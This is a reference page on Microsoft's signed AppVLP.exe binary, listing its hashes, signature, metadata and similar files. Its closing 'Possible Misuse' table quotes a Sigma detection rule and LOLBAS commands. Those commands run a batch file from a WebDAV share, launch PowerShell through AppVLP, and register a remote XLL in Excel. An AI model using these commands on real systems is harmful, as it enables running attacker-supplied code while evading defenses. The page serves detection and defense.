---
title: AppVLP.exe | appvlp
excerpt: What is AppVLP.exe?
---

# AppVLP.exe 

* File Path: `C:\Program Files (x86)\Microsoft Office\root\Client\AppVLP.exe`
* Description: appvlp

## Hashes

Type | Hash
-- | --
MD5 | `F8CF92A63D69595CE0E6ECB9265EA7F7`
SHA1 | `B74D6562FD2532D747F9557252D3778C7FE8BCCB`
SHA256 | `234317E8FF5CB4C2FA2808C63ABBB6CE7641B935C74D50AC63355FECE4F6DD75`
SHA384 | `E680B0D6BF84509726866B86D4D323AAFEE43E9E58BF55B2F7D32A69D7ADD0B1D8B50E737E8EE823DC8CAD26F6D138BA`
SHA512 | `3552BFD787819EC46B56EE4F14ECF55C0FB80E589CECACD60F7F1C197EDB719C06A25A5A4702C7673D58D8FCBB3D7E97EB1EF73544AB05F209B2583B2C8F9D31`
SSDEEP | `6144:82+5Fx/7DxP1D7nrHjxy+VEmmt0fSoD7nOnqB9PI/W:82+5FxzDxV7rD0+Tmt0LDTjBpI/W`
IMP | `44BF41E91411D577FA1FA5B04424B158`
PESHA1 | `84EC3CF8DB044DC743EBC19F1AB9D1BA68852485`
PE256 | `95E93166D21EC2D2730073A6038009B90C8FB38CA10FECAFED8A18E2E4488E28`

## Runtime Data

### Child Processes:
help.exe

### Loaded Modules:

Path |
-- |
C:\Program Files (x86)\Microsoft Office\root\Client\AppVLP.exe |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\wow64.dll |
C:\Windows\System32\wow64cpu.dll |
C:\Windows\System32\wow64win.dll |


## Signature

* Status: Signature verified.
* Serial: `33000001B1DDEDBA54E965B85F0001000001B1`
* Thumbprint: `9DC17888B5CFAD98B3CB35C1994E96227F061675`
* Issuer: CN=Microsoft Code Signing PCA, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: appvlp.exe
* Product Name: Microsoft Application Virtualization (App-V)
* Company Name: Microsoft Corporation
* File Version: 5.1.145.0
* Product Version: 5.1.145.0
* Language: English (United States)
* Legal Copyright:  2015 Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/72
* VirusTotal Link: https://www.virustotal.com/gui/file/234317e8ff5cb4c2fa2808c63abbb6ce7641b935c74d50ac63355fece4f6dd75/detection/

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Program Files (x86)\Microsoft Office\root\Client\AppVDllSurrogate32.exe](AppVDllSurrogate32.exe-BB87D970CD29CC07A84A92E637ADD9A2.md) | 36
[C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe](MavInject32.exe-AC6978D0FEF8F6F2F07051473D188F02.md) | 33
[C:\Windows\SysWOW64\mavinject.exe](mavinject.exe-49338D141DD60CA212D85F60521FB1DF.md) | 33
[C:\Windows\SysWOW64\mavinject.exe](mavinject.exe-644673C741AB152A3E8904A5B4080489.md) | 32
[C:\WINDOWS\SysWOW64\mavinject.exe](mavinject.exe-8FE5871DE2870F39CFA317FA5C28988D.md) | 33
[C:\Windows\SysWOW64\mavinject.exe](mavinject.exe-B8B01B6A24B8A2BA242D96DB63298120.md) | 36

## Possible Misuse

*The following table contains possible examples of `AppVLP.exe` being misused. While `AppVLP.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `- '*\AppVLP.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `Name: Appvlp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Command: AppVLP.exe \\webdav\calc.bat`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `Description: Executes calc.bat through AppVLP.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Path: C:\Program Files\Microsoft Office\root\client\appvlp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Appvlp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Appvlp.yml) | `- Path: C:\Program Files (x86)\Microsoft Office\root\client\appvlp.exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


